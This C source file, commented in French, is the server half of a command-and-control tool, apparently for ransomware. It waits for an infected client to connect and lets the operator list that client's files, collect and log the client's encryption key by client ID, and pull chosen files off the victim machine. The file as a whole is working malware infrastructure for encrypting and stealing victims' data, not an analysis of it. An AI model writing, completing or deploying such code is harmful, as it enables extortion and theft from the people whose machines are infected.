#include "common.h"
#include "serveur.h"

#define SERVER_PORT 8081
#define ID_LENGTH 8
#define LOG_FILE "server_log.txt"

void printServerBanner() {
    printf("  ________  ______   _____  __  _______\n");
    printf("  / ___/ _ \\/ ___/ | / / _ \\/ / / / ___/\n");
    printf(" (__  )  __/ /   | |/ /  __/ /_/ / /    \n");
    printf("/____/\\___/_/    |___/\\___/\\__,_/_/     \n");
    printf("\n");
}

void handleClient(my_socket_t clientSocket) {
    char clientMessage[1024];
    char serverCommand[1024];
    char fichier[256];
    char buffer[1024];
    char encryptionKey[128];
    //-------------------------------------------
    // Reception de l'identifiant du client
    char clientId[ID_LENGTH + 1] = {0};
    int bytesReceived = recv(clientSocket, clientId, ID_LENGTH, 0);
    if (bytesReceived <= 0) {
        printf("Erreur de reception de l'id client.\n");
        return;
    }
    clientId[bytesReceived] = '\0'; // Terminer la chaîne
    printf("Identifiant du client reçu : %s\n", clientId);
    //--------------------------------------------
    while (1) {
        printf("Entrez une commande à envoyer au client (list, chiffrement, exfiltration, exit) : ");
        scanf("%s", serverCommand);

        if (send(clientSocket, serverCommand, (int)strlen(serverCommand), 0) < 0) {
            printf("echec de l'envoi de la commande.\n");
            break;
        }

        if (strcmp(serverCommand, "exit") == 0) {
            printf("Deconnexion du client.\n");
            break;
        }

        //-------------------LIST-------------------------------
        if (strcmp(serverCommand, "list") == 0) {
            printf("Reception de la liste des fichiers du client...\n");
            char *line;
            while (1) {
                memset(clientMessage, 0, sizeof(clientMessage));
                int bytesReceived = recv(clientSocket, clientMessage, sizeof(clientMessage) - 1, 0);
                if (bytesReceived <= 0) {
                    printf("Connexion fermee ou erreur.\n");
                    return;
                }

                clientMessage[bytesReceived] = '\0'; // Terminaison de chaîne
                line = strtok(clientMessage, "\n");  // Decoupe en lignes
                while (line != NULL) {
                    if (strcmp(line, "END_OF_LIST") == 0) {
                        printf("Fin de la liste des fichiers reçue.\n");
                        break;
                    }
                    printf("Fichier : %s\n", line);
                    line = strtok(NULL, "\n");
                }
                if (line && strcmp(line, "END_OF_LIST") == 0) {
                    break;
                }
            }
            printf("Prêt pour la prochaine commande.\n");
            continue;
        }

        //-----------------------CHIFFREMENT--------------------
        if (strcmp(serverCommand, "chiffrement") == 0) {
            printf("Reception de la cle de chiffrement du client...\n");
            memset(encryptionKey, 0, sizeof(encryptionKey));

            // Reception de la cle de chiffrement
            bytesReceived = recv(clientSocket, encryptionKey, sizeof(encryptionKey) - 1, 0);
            if (bytesReceived <= 0) {
                printf("Erreur de reception de la cle de chiffrement.\n");
                continue;
            }
            encryptionKey[bytesReceived] = '\0'; // Terminer la chaîne
            printf("Cle de chiffrement reçue : %s\n", encryptionKey);

            // Stockage de la cle dans le fichier de log
            FILE *logFile = fopen(LOG_FILE, "a");
            if (logFile) {
                fprintf(logFile, "Client ID: %s, Key: %s\n", clientId, encryptionKey);
                fclose(logFile);
                printf("Cle de chiffrement enregistree dans %s\n", LOG_FILE);
            } else {
                printf("Erreur : impossible d'ouvrir le fichier de log %s\n", LOG_FILE);
            }

            // Supprimer la cle apres utilisation
            memset(encryptionKey, 0, sizeof(encryptionKey));
            printf("Cle de chiffrement supprimee de la memoire.\n");
            continue;
        }

        //-----------------------EXFILTRATION--------------------
        if (strcmp(serverCommand, "exfiltration") == 0) {
            printf("Entrer le chemin du fichier à exfiltrer : ");
            scanf("%s", fichier);
            
            // Envoi de la commande 'exfiltration' au client
            if (send(clientSocket, serverCommand, (int)strlen(serverCommand), 0) < 0) {
                printf("echec de l'envoi de la commande 'exfiltration'.\n");
                break;
            }

            // Envoi du nom du fichier au client
            if (send(clientSocket, fichier, (int)strlen(fichier), 0) <= 0) {
                printf("Erreur lors de l'envoi du nom de fichier au client.\n");
                return;
            }
            printf("Nom du fichier demande : %s\n", fichier);
            
            // Preparation pour recevoir le fichier exfiltre
            FILE *outFile = fopen(fichier, "wb"); // Utilisez "wb" pour ecrire en binaire
            if (outFile == NULL) {
                printf("Erreur: impossible de creer le fichier %s\n", fichier);
                break;
            }

            printf("Reception du fichier en cours...\n");
            while (1) {
                memset(buffer, 0, sizeof(buffer));
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if (bytesReceived <= 0) {
                    printf("Erreur lors de la reception des donnees ou connexion fermee.\n");
                    fclose(outFile);
                    break;
                }

                buffer[bytesReceived] = '\0'; // Terminaison de chaîne pour comparaison

                if (strcmp(buffer, "END_OF_FILE") == 0) {
                    printf("Fin de la reception du fichier.\n");
                    break;
                }

                // ecrire les donnees reçues dans le fichier
                fwrite(buffer, 1, bytesReceived, outFile);
            }
            fclose(outFile);
            printf("Fichier enregistre : %s\n", fichier);
            continue;
        }

        // Gestion des autres commandes ou des reponses generales
        memset(clientMessage, 0, sizeof(clientMessage));
        if (recv(clientSocket, clientMessage, sizeof(clientMessage), 0) < 0) {
            printf("echec de la reception de l'accuse de reception.\n");
            break;
        }
        printf("Reponse du client : %s\n", clientMessage);
    }
}

int main() {
    printServerBanner();

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("echec de l'initialisation de Winsock. Code d'erreur : %d\n", WSAGetLastError());
        return 1;
    }
#endif

    my_socket_t serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET_VALUE) {
        perror("echec de la creation du socket");
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Socket cree avec succes.\n");
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(SERVER_PORT);

    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR_VALUE) {
        perror("echec du bind");
#ifdef _WIN32
        printf("Code d'erreur WSA : %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Bind reussi sur le port %d.\n", SERVER_PORT);
    }

    if (listen(serverSocket, 3) == SOCKET_ERROR_VALUE) {
        perror("echec de l'ecoute");
#ifdef _WIN32
        printf("Code d'erreur WSA : %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("En ecoute sur le port %d...\n", SERVER_PORT);
    }

#ifdef _WIN32
    int clientAddrLen = sizeof(clientAddr);
#else
    socklen_t clientAddrLen = sizeof(clientAddr);
#endif

    clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET_VALUE) {
        perror("echec de l'acceptation");
#ifdef _WIN32
        printf("Code d'erreur WSA : %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Client connecte avec succes.\n");
    }

    handleClient(clientSocket);

    closesocket(clientSocket);
    closesocket(serverSocket);

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
